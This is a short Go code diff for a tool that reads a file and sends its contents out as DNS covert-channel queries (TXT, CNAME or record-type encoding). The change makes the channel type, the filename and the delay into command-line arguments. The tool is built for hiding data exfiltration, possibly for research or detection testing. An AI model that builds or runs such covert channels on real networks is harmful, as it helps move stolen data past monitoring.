@@ -5,6 +5,7 @@ import (
 	"math/rand"
 	"net"
 	"os"
+	"strconv"
 	"time"
 
 	"github.com/google/gopacket"
@@ -116,8 +117,8 @@ func udpSender(
 	}
 }
 
-func readFileToString() (string, error) {
-	data, err := os.ReadFile("message.txt")
+func readFileToString(filename string) (string, error) {
+	data, err := os.ReadFile(filename)
 	if err != nil {
 		return "", err
 	}
@@ -125,13 +126,24 @@ func readFileToString() (string, error) {
 	return string(data), nil
 }
 
+var COVERT_CHANNEL_GENERATOR_MAP = map[string]func(message string) ([][]byte, error){
+	"txt":   generateCovertTXTQueries,
+	"cname": generateCovertCNAMEQueries,
+	"typed": generateCovertTypeQueries,
+}
+
 func main() {
-	message, err := readFileToString()
+	args := os.Args
+	typeArg := args[1]  // covert channel type
+	filename := args[2] // covert channel data file
+	waitBetween, _ := strconv.Atoi(args[3])
+
+	message, err := readFileToString(filename)
 
 	if err != nil {
 		fmt.Println("Error reading file:", err)
 		return
 	}
 
-	udpSender(generateCovertTypeQueries, message, 10)
+	udpSender(COVERT_CHANNEL_GENERATOR_MAP[typeArg], message, waitBetween)
 }
